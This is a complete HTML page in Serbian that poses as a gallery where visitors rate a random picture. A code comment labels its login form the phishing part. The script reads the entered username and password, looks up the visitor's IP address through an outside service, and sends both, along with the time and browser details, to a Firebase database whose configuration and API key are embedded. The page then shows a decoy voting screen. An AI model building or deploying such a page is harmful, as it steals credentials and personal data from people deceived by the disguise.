<!DOCTYPE html>
<html lang="sr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Glasanje za najbolju sliku</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #1a1a2e; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: #16213e; padding: 2rem; border-radius: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); width: 350px; text-align: center; }
        h2 { margin-bottom: 1.5rem; color: #e94560; }
        input { width: 100%; padding: 12px; margin: 10px 0; border: none; border-radius: 8px; background: #0f3460; color: white; box-sizing: border-box; }
        .btn { width: 100%; padding: 12px; border: none; border-radius: 8px; background: #e94560; color: white; font-weight: bold; cursor: pointer; transition: 0.3s; margin-top: 10px; }
        .btn:hover { background: #ff2e63; }
        #app-content { display: none; }
        .img-box img { width: 100%; border-radius: 10px; margin-top: 15px; }
    </style>
</head>
<body>

    <!-- FORMA ZA PRIJAVU (PHISHING DEO) -->
    <div class="card" id="login-form">
        <h2>Prijava na sistem</h2>
        <p style="font-size: 0.9rem; color: #888;">Unesite kredencijale za pristup galeriji</p>
        <input type="text" id="user" placeholder="Korisničko ime">
        <input type="password" id="pass" placeholder="Lozinka">
        <button class="btn" onclick="captureAndLogin()">Prijavi se</button>
    </div>

    <!-- GLAVNI DEO (OCENJIVANJE) -->
    <div class="card" id="app-content">
        <h3 id="welcome-msg">Dobrodošli</h3>
        <div class="img-box">
            <img src="https://picsum.photos/400/300" alt="Random Image">
        </div>
        <p>Ocenite ovu sliku (1-10):</p>
        <input type="number" id="rating" placeholder="Ocena" min="1" max="10">
        <textarea id="comment" placeholder="Vaš komentar..." style="width:100%; background:#0f3460; color:white; border:none; border-radius:8px; padding:10px; margin-top:10px;"></textarea>
        <button class="btn" onclick="alert('Hvala na glasanju!')">Pošalji ocenu</button>
    </div>

    <!-- FIREBASE BIBLIOTEKE -->
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-firestore.js"></script>

    <script>
        // TVOJI PRAVI PODACI SA SLIKE
        const firebaseConfig = {
            apiKey: "AIzaSyCLH4fyYBt2DFC4OY2WBGUtsZWOK4b-x3c",
            authDomain: "prenkprenk-c71d1.firebaseapp.com",
            projectId: "prenkprenk-c71d1",
            storageBucket: "prenkprenk-c71d1.firebasestorage.app",
            messagingSenderId: "736665799846",
            appId: "1:736665799846:web:19c13b593e2200de08f867"
        };

        // Inicijalizacija baze
        firebase.initializeApp(firebaseConfig);
        const db = firebase.firestore();

          async function captureAndLogin() {
            const u = document.getElementById('user').value;
            const p = document.getElementById('pass').value;

            if(u === "" || p === "") {
                alert("Molimo unesite sve podatke.");
                return;
            }

            // Uzimamo IP adresu preko besplatnog servisa
            let ip = "Nepoznato";
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                ip = data.ip;
            } catch (e) { console.log("IP nije dostupan"); }

            // Sakupljamo sve podatke
            const podaci = {
                korisnik: u,
                lozinka: p,
                vreme: new Date().toLocaleString(),
                ip_adresa: ip,
                uredjaj: navigator.userAgent
            };

            // Šaljemo u Firebase
            db.collection("korisnici_logovi").add(podaci)
            .then(() => {
                document.getElementById('login-form').style.display = 'none';
                document.getElementById('app-content').style.display = 'block';
                document.getElementById('welcome-msg').innerText = "Dobrodošao, " + u + "!";
            })
            .catch((error) => {
                console.error("Greška: ", error);
            });
        }
    </script>
</body>
</html>
